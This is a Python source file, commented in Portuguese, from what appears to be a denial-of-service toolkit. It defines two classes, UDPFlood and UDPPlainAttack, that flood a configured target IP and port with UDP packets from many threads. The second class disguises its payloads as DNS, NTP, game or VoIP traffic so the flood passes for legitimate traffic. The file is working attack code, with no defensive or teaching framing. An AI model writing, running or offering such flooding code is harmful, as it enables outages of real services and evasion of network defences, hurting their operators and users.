"""
Implementação de ataques UDP
"""
import socket
import random
import threading
import time
from .base import BaseAttack
from ..core.config import AttackConfig

class UDPFlood(BaseAttack):
    """UDP Flood de alta velocidade"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando UDP Flood...")
        
        # Gera dados aleatórios uma vez para eficiência
        data = random._urandom(min(self.config.packet_size, 65507))
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        sock.settimeout(1)
                        sock.sendto(data, (self.config.target_ip, self.config.target_port))
                        packets_sent += 1
                        self._update_stats(len(data))
                        
                except socket.timeout:
                    # Timeout é normal em floods UDP
                    pass
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes UDP")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class UDPPlainAttack(BaseAttack):
    """UDP Plain - Pacotes UDP simples"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando UDP Plain Attack...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        sock.settimeout(1)
                        
                        # Dados mais realistas para parecer tráfego legítimo
                        payload = self._generate_realistic_payload()
                        sock.sendto(payload, (self.config.target_ip, self.config.target_port))
                        packets_sent += 1
                        self._update_stats(len(payload))
                        
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes UDP Plain")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _generate_realistic_payload(self) -> bytes:
        """Gera payload UDP que parece tráfego legítimo"""
        payload_types = [
            self._generate_dns_like_payload,
            self._generate_ntp_like_payload,
            self._generate_game_traffic_payload,
            self._generate_voip_like_payload
        ]
        
        generator = random.choice(payload_types)
        return generator()
    
    def _generate_dns_like_payload(self) -> bytes:
        """Gera payload similar a consulta DNS"""
        return bytes([0x00, 0x01, 0x01, 0x00, 0x00, 0x01]) + random._urandom(20)
    
    def _generate_ntp_like_payload(self) -> bytes:
        """Gera payload similar a NTP"""
        return bytes([0x1B]) + random._urandom(47)  # NTP version 3
    
    def _generate_game_traffic_payload(self) -> bytes:
        """Gera payload similar a tráfego de jogos"""
        return random._urandom(random.randint(10, 100))
    
    def _generate_voip_like_payload(self) -> bytes:
        """Gera payload similar a VoIP"""
        # Payload RTP-like
        rtp_header = bytes([0x80, 0x00]) + random._urandom(10)
        voice_data = random._urandom(random.randint(20, 160))
        return rtp_header + voice_data